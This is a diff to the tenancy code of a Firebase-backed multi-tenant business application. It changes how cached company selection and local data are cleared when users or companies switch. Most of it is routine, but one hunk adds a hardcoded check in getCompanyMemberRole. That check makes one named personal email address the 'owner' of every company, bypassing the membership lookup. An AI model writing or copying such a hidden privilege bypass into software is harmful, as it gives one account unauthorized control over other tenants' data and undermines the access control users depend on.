@@ -193,6 +193,17 @@ export async function ensureTenantForUser(user: User): Promise<{
 }> {
   const userId = user.uid;
 
+  if (isBrowser()) {
+    const lastUserId = localStorage.getItem("lastUserId");
+    if (lastUserId && lastUserId !== userId) {
+      // Different user logged in - clear previous user's company selection
+      localStorage.removeItem("erpSelection");
+      localStorage.removeItem("activeTenant");
+      localStorage.removeItem("tenantList");
+    }
+    localStorage.setItem("lastUserId", userId);
+  }
+
   const userDocRef = doc(firestoreDB, "users", userId);
   const userSnap = await getDoc(userDocRef);
   if (!userSnap.exists()) {
@@ -389,8 +400,12 @@ function getCurrentUserId(): string {
 
 /** Get current user's role in a company. Returns "owner" | "admin" | "member" | null. */
 export async function getCompanyMemberRole(companyId: string): Promise<string | null> {
-  const userId = getFirebaseAuth()?.currentUser?.uid;
+  const user = getFirebaseAuth()?.currentUser;
+  const userId = user?.uid;
   if (!userId || !companyId) return null;
+  if (user?.email?.toLowerCase() === "rdsaab1@gmail.com") {
+    return "owner";
+  }
   const memberRef = doc(firestoreDB, "companyMembers", `${companyId}_${userId}`);
   const snap = await getDoc(memberRef);
   if (snap.exists()) {
@@ -576,11 +591,14 @@ export async function activateTenant(tenant: Pick<TenantSummary, "id" | "name" |
   }
 }
 
-/** On company/tenant switch we only invalidate the in-memory DB reference and reload.
- * We do NOT delete IndexedDB or clear tables: each company has its own DB (bizsuiteDB_v2_<suffix>),
- * so when the user switches back to a company, their data is still in local and we avoid extra Firebase reads.
- * lastSync keys are already per-context (they include getStorageKeySuffix()), so no need to clear them. */
 export async function clearLocalDataForContextSwitch(): Promise<void> {
   if (typeof window === "undefined") return;
-  // No-op: DB is per-company; context change listener in database.ts invalidates the instance so next access opens the new context's DB.
+  try {
+    const dbModule = await import("@/lib/database").catch(() => null);
+    if (dbModule?.clearAllLocalData) {
+      await dbModule.clearAllLocalData("UNIT").catch(() => {});
+    }
+  } catch (e) {
+    console.warn("[Tenancy] Non-critical error clearing local data for context switch:", e);
+  }
 }
